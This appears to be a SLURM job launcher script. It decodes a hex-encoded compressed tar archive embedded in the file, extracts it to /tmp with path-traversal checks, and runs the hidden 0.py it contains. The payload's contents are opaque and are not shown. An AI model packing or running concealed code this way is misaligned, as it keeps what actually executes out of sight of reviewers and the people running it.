#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed954d8fdb201086f7ec5f8172b12d45c4f8db59e5d87b0f6d2fd56a85ed714236010b4877d3aaffbd6047abb4957adbdd569de7608ccdbc03330c24746f94bc795112479924539bfcde2659563cbfcfdfcbaa4a6e48f2b2d39a3919cbb573f91abefe42be2dac7a00b95893459b30e8ea8a9743dab48b25598cfc7c50bcbf373b9e16a51f92f67dc3daaccdf2aaec3268fa846555d2e74d517645cba01f5a8012eaca6590b5851bd217e95000cb866ee0757aadda9e2d18275aa44d5ae685ff73e0f2ca59ddd60dcbd9d0405aa5755e577dd6d755ce7b48f382654d0e79363455d3d735773465c759d3b6755196595eb36af1fdad83fb0f90d0f1fce23efe5cff8cb1fcd7facff30cebff3510c751694bccd92cfd45b0dc71b33b8876e982328803048356473272eb3f92cbe0f7ae1be88d6f226748b9de7ef9cceee2db6ee335a82f6f13457a1526d3ed12c65483ab780b4f368ae380cfa6e16ad46a0f9d5d75ea783c4961cfabfdfe0c27b90de355f7399c4ea6f0cecbd8edd730e0c680737f99229d4f8a88cfe2d371e2d4e90e9e7ab105e35c6d364ee5e7532cbc0b1e85dd91cbfaa81a41463c26dc10bb0ec8a0340122e4d421622052590254f22350bf51acf1d651a874b7e3babfdfb16415c6eb4e492be409ae6d84f10ea29838c990d2d0ab4eeb9ee5623a7ab9b5e6c200f9c40f2778a7b5d251f8511a3ef8498c271bc64e72dcb8508ee16a36bc1dbd25484b8f0fbdd0d1dc319b0ffa044b7812c6deab87a917bba18f5a58b804c7529700cd3b3b4d0ce6acf884f824fa1c53217d84a36469ac8e26a7eeefb405ae164cf7ea792b1cb990817f443a0ede7a2f23088220088220088220088220088220088220088220c8ffca0f6b2d772e00280000')
r=Path('/tmp')/('a'+j+'b01ec87a6f29b')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
